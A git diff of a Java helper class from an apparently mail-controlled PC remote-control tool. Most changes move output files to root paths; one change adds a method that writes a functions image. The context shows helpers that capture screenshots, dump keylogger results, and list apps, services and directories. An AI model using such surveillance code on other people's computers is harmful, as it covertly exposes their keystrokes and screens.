@@ -1,5 +1,7 @@
 package com.example.pcremotecontrol.servers;
 
+import com.example.pcremotecontrol.MainApplication;
+
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -9,8 +11,6 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class MailServerHelpers {
-    private static String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
-
     public static String getAppsList() {
         List<String> apps = new ArrayList<>();
         try {
@@ -24,7 +24,7 @@ public class MailServerHelpers {
             reader.close();
 
             // Write to File
-            String fileAddressApps = fileAddress + "/apps.txt";
+            String fileAddressApps = "/apps.txt";
             FileWriter writer = new FileWriter(fileAddressApps);
             for(String str: apps) {
                 writer.write(str + System.lineSeparator());
@@ -53,7 +53,7 @@ public class MailServerHelpers {
             reader.close();
 
             // Write to File
-            String fileAddressServices = fileAddress + "/services.txt";
+            String fileAddressServices = "/services.txt";
             FileWriter writer = new FileWriter(fileAddressServices);
             for(String str: services) {
                 writer.write(str + System.lineSeparator());
@@ -129,7 +129,7 @@ public class MailServerHelpers {
             BufferedImage screenshot = robot.createScreenCapture(screenRect);
 
             // Save the Screenshot to a File
-            String fileAddressScreenshot = fileAddress + "/screenshot.jpeg";
+            String fileAddressScreenshot = "/screenshot.jpeg";
             File bufferOutput = new File(fileAddressScreenshot);
             ImageIO.write(screenshot, "jpeg", bufferOutput);
             return fileAddressScreenshot;
@@ -188,7 +188,7 @@ public class MailServerHelpers {
             List<String> keylogger = MailServerKeylogger.getInstance().getKeyloggerResult();
 
             // Write to File
-            String fileAddressKeylogger = fileAddress + "/keylogger.txt";
+            String fileAddressKeylogger = "/keylogger.txt";
             FileWriter writer = new FileWriter(fileAddressKeylogger);
             for(String str: keylogger) {
                 writer.write(str + System.lineSeparator());
@@ -216,7 +216,7 @@ public class MailServerHelpers {
             }
 
             // Write to File
-            String fileAddressDirectory = fileAddress + "/directory.txt";
+            String fileAddressDirectory = "/directory.txt";
             FileWriter writer = new FileWriter(fileAddressDirectory);
             for(String str: directoryChildren) {
                 writer.write(str + System.lineSeparator());
@@ -242,5 +242,23 @@ public class MailServerHelpers {
             return "";
         }
     }
+
+    public static String getFunctionsImage() throws IOException {
+        String output = "/functions.jpg";
+        File f = new File(output);
+        if(!f.exists()) {
+            initializeFunctionsImage();
+        }
+        return output;
+    }
+
+    private static void initializeFunctionsImage() throws IOException {
+        BufferedImage image = ImageIO.read(MainApplication.class.getResourceAsStream("functions.jpg"));
+        String fileAddressFunction = "/functions.jpg";
+        File bufferOutput = new File(fileAddressFunction);
+        ImageIO.write(image, "jpg", bufferOutput);
+    }
+
+
 }
 
